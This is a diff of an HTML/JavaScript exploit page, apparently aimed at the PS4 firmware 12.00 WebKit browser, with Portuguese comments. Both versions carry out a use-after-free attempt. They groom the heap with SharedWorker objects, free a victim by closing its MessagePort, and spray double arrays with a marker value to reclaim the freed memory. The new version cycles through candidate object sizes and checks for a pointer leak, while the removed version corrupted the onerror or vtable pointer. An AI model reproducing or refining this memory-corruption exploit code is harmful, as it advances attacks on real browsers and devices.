@@ -2,84 +2,155 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 LEAK MASTER</title>
+    <title>PS4 12.00 DOUBLE SPRAY HUNTER</title>
     
 </head>
 <body>
-    <h1>LEAK MASTER (Internal Pointer)</h1>
-    <h3>Alvo: Corromper ponteiro 'onerror' ou 'vtable'</h3>
-    <button onclick="start_leak_hunt()">INICIAR CAÇADA</button>
+
+    <h1>PS4 12.00 - DOUBLE ARRAY SPRAY</h1>
+    <h3>Estratégia: Butterfly Heap Attack (Lapse Style)</h3>
+    <h2 id="current_status">Inicializando...</h2>
     <div id="log"></div>
+    
+    <button onclick="reset_test()">REINICIAR TESTES (ZERAR)</button>
 
     <script>
-        function log(msg, type="") {
+        function log(msg) {
             var d = document.getElementById("log");
-            var color = type === "leak" ? "#ff00ff" : "#0f0";
-            d.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            d.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             d.scrollTop = d.scrollHeight;
         }
 
-        // Tamanho 0xC0 (192 bytes) - Que deu Panic no seu teste DoubleArray!
-        // Vamos usar esse tamanho, pois sabemos que ele sobrescreve algo vital.
-        var TARGET_SIZE = 0xC0; 
+        // =================================================================
+        // CONFIGURAÇÃO DE TAMANHOS
+        // =================================================================
+        // Objetos DOM no WebKit costumam ter estes tamanhos.
+        // O SharedWorker deve ser um destes.
+        var CANDIDATE_SIZES = [
+            0x20, 0x30, 0x40, 0x50, 0x60, 0x80, 
+            0xA0, 0xC0, 0xE0, 
+            0x100, 0x120, 0x140, 0x160, 0x180, 
+            0x200, 0x240, 0x280, 0x300, 0x400,
+            0x800, 0x1000, 0x2000
+        ];
 
-        function build_payload() {
-            // Usamos Double Array porque ele acessa o Butterfly Heap (onde o Worker provavelmente está)
-            var elementCount = TARGET_SIZE / 8;
+        var OFFSET_BASE = 0;
+
+        // =================================================================
+        // LÓGICA DO TESTE
+        // =================================================================
+        function init() {
+            var saved = localStorage.getItem("double_idx");
+            if (saved) OFFSET_BASE = parseInt(saved);
+
+            if (OFFSET_BASE >= CANDIDATE_SIZES.length) {
+                document.getElementById("current_status").innerText = "FIM DA LISTA.";
+                log("Todos os tamanhos testados. Se não houve crash, o UAF não está alinhando.");
+                return;
+            }
+
+            var current_size = CANDIDATE_SIZES[OFFSET_BASE];
+            document.getElementById("current_status").innerText = `TESTANDO: 0x${current_size.toString(16).toUpperCase()}`;
+            
+            log(`Preparando Double Array de ${current_size} bytes...`);
+            
+            setTimeout(() => run_exploit(current_size), 1000);
+        }
+
+        function next_size() {
+            OFFSET_BASE++;
+            localStorage.setItem("double_idx", OFFSET_BASE);
+            log("Falhou. Recarregando para próximo tamanho...");
+            setTimeout(() => location.reload(), 1500);
+        }
+
+        function reset_test() {
+            localStorage.setItem("double_idx", 0);
+            location.reload();
+        }
+
+        // =================================================================
+        // PAYLOAD: DOUBLE ARRAY
+        // =================================================================
+        function build_double_payload(sizeInBytes) {
+            // Um Double ocupa 8 bytes.
+            // Precisamos criar um array com (Size / 8) elementos.
+            var elementCount = Math.floor(sizeInBytes / 8);
+            
+            // Cria array nativo
             var arr = new Array(elementCount);
             
-            // Valor Mágico: 1.1 (0x3FF199999999999A)
-            // É um valor seguro que não causa crash imediato se lido como float,
-            // mas se lido como ponteiro, aponta para Userland (0x3FF1...).
+            // Preenche com um Float específico que em Hex é 0x1337133713371337
+            // Se o kernel ler isso como ponteiro e crashar, o log de erro vai mostrar esse número.
+            // Valor Float: 1.3351155528519837e-306
+            var marker = 1.3351155528519837e-306; 
+
             for(var i=0; i<arr.length; i++) {
-                arr[i] = 1.1; 
+                arr[i] = marker;
             }
+            
             return arr;
         }
 
+        // =================================================================
+        // EXECUÇÃO
+        // =================================================================
         var workers = [];
 
-        async function start_leak_hunt() {
-            var payload = build_payload();
-            log(`Payload construído (0x${TARGET_SIZE.toString(16)}).`);
+        async function run_exploit(size) {
+            // Cria o payload modelo
+            var payload_model = build_double_payload(size);
 
-            // 1. Grooming (380)
+            // 1. GROOMING (380)
             for(let i=0; i<380; i++) {
                 try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
             }
 
-            // 2. Trigger (403)
+            // 2. TRIGGER (403)
             var count = 0;
-            var limit = 403 - 380;
+            var limit = 403 - 380; 
 
             var it = setInterval(() => {
                 if (count >= limit) {
                     clearInterval(it);
                     
-                    // A VÍTIMA
+                    // Vítima (403)
                     var v = workers.pop();
-                    
-                    // Define um handler antes de liberar
-                    // O ponteiro para essa função fica guardado dentro do objeto Worker
-                    v.onerror = function() { console.log("Erro original"); };
-                    
-                    // Guarda referência para teste
                     var p = v.port; 
                     
                     // FREE
                     v.port.close();
+                    v = null; // Solta referência do worker
                     
-                    // SPRAY (Reclaim)
+                    // SPRAY (DOUBLE ARRAY)
+                    // Clona o array modelo milhares de vezes para encher o buraco
+                    // O Slice é rápido e cria uma cópia física na memória
                     var spray = [];
                     for(let k=0; k<10000; k++) {
-                        spray.push(payload.slice(0));
+                        spray.push(payload_model.slice(0));
                     }
 
-                    // TESTE DE LEAK
-                    setTimeout(() => {
-                        check_leak(v, p);
-                    }, 500);
-                    
+                    // CHECK DE SUCESSO
+                    try {
+                        var s = p.toString();
+                        
+                        // Se virou algo que não é MessagePort (ex: undefined, ou string vazia, ou crashou)
+                        if (s.indexOf("MessagePort") === -1) {
+                            document.body.style.backgroundColor = "#005500";
+                            alert(`!!! SUCESSO !!!\nObjeto substituído no tamanho: 0x${size.toString(16)}\nIsso é um LEAK!`);
+                            // Pausa o loop de testes
+                            return;
+                        } else {
+                            // Teste extra: Tentar ler propriedade inexistente para forçar crash se ponteiro estiver sujo
+                            var temp = p.onmessage;
+                        }
+                    } catch(e) {
+                        log("Erro na leitura: " + e);
+                        // Se o erro tiver números hexadecimais, é vitória.
+                    }
+
+                    // Nada aconteceu, próximo.
+                    next_size();
                     return;
                 }
                 
@@ -92,39 +163,7 @@
             }, 50);
         }
 
-        function check_leak(victim, port) {
-            log("Verificando corrupção...");
-
-            // Teste 1: Ler propriedade 'onerror'
-            // Se sobrescrevemos o objeto, o ponteiro para a função deve ter virado 0x3FF1...
-            try {
-                var handler = victim.onerror;
-                log("Handler atual: " + handler);
-                
-                if (handler !== null && typeof handler !== 'function') {
-                    log("!!! LEAK ENCONTRADO (Handler corrompido) !!!", "leak");
-                    log("Valor lido: " + handler, "leak");
-                    alert("Leak Confirmado! Verifique o Log.");
-                }
-            } catch(e) {
-                log("Erro ao ler handler: " + e);
-                // Se o erro contiver um endereço, é um leak!
-                if (e.toString().match(/0x[0-9a-fA-F]+/)) {
-                    log("!!! LEAK NO ERRO !!! " + e, "leak");
-                    alert("Leak no Erro!");
-                }
-            }
-
-            // Teste 2: Disparar erro
-            // Se o ponteiro vtable foi corrompido, isso vai crashar ou comportar estranho
-            try {
-                victim.dispatchEvent(new Event('error'));
-            } catch(e) {
-                log("Erro no dispatch: " + e);
-            }
-
-            log("Teste finalizado. Se o console não desligou e nada apareceu, tente outro tamanho.");
-        }
+        init();
     </script>
 </body>
 </html>
